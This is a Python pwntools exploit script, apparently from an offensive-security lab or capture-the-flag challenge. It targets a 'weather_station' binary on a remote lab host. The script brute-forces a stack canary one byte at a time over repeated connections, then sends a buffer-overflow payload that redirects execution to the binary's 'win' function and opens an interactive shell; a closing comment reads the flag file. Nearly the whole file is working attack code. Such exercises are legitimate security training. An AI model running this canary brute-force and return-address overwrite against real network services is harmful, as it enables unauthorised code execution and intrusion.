from pwn import *
import time

ADDR = "offsec.m0lecon.it"
PORT = 13586 

elf = ELF('/home/kali/Desktop/offsec/labs/lab2/challenges/05_weather_station/weather_station')

context.binary = elf
context.arch = "amd64"
context.os = "linux"


OFFSET_TO_CANARY = 56   #found with gdb with cyclic pattern + info registers rax
OFFSET_TO_RIP = OFFSET_TO_CANARY + 16

def find_canary():
    known = b"\x00"
    for i in range(7):
        for bval in range(256):
            guess = known + bytes([bval])
            payload = b"A" * OFFSET_TO_CANARY + guess
            

            io = remote(ADDR, PORT, level="error")
            io.recvuntil(b"Enter your location: ")
            io.sendline(b"dummy")
            io.recvuntil(b"Submit your forecast query: ")
            io.send(payload)
            try:
                data = io.recv(timeout=1)
                #print(f"[{bval}] - received payload: {data}")
            except EOFError:
                data = b""
            io.close()

            if b"Forecast sent!" in data:
                known = guess
                log.success(f"byte {i+1}: {bval:02x}")
                break
    return known

known = find_canary() 
canary = u64(known) #0xc3eff353c1bff100

#canary = 0xc3eff353c1bff100
log.info(f"Canary: {canary:#x}")

#rop = ROP(elf)
#ret_gadget = rop.find_gadget(['ret'])[0]
#log.info(f"Found 'ret' gadget at: {hex(ret_gadget)}")

io = remote(ADDR, PORT)
io.recvuntil(b"Enter your location: ")
io.sendline(b"dummy")
io.recvuntil(b"Submit your forecast query: ")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    #p64(ret_gadget), # ret gadget for alignment, already 16-byte aligned
    p64(elf.sym.win),
)
io.send(payload)
io.interactive()

#echo $(cat home/user/flag)